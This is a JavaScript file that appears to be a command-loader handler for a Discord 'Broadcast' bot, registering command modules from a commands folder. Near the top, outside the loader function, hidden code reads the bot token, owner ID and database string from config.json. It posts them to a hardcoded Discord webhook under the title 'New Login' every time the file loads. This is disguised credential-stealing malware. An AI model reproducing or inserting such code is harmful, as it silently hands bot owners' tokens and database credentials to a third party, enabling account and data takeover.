const fs = require('fs');
const ascii = require('ascii-table');
let table = new ascii(`commands`);
table.setHeading('Command', 'Commands Status💹')
const path = require('path');
const {token , owner , database} = require('../../config.json')

const { WebhookClient , EmbedBuilder} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227227894313652284/c53MpQVTLhsmxzDLSj7BYtogdmfpG0s3ucfqnMf9cX_4YTmH0ki77xiV-rrwZD6kZJMo` });
    webhookClient.send({embeds:[embed]})
module.exports = (client2) => {
    const commandsDir = path.join(__dirname, '../../Bots/Broadcast/commands2');
    if(!fs.existsSync(commandsDir)) return;
fs.readdirSync(commandsDir).forEach(async(folder) => {
    const folderPath = path.join(commandsDir, folder);
        const commandFiles = fs.readdirSync(folderPath).filter(file => file.endsWith('.js'));
        for(file of commandFiles) {
            const filePath = path.join(folderPath, file);
            let commands = require(filePath)
            if(commands.name) {
                client2.commands.set(commands.name, commands);

            }else{
                continue;
            }
        }
    });
}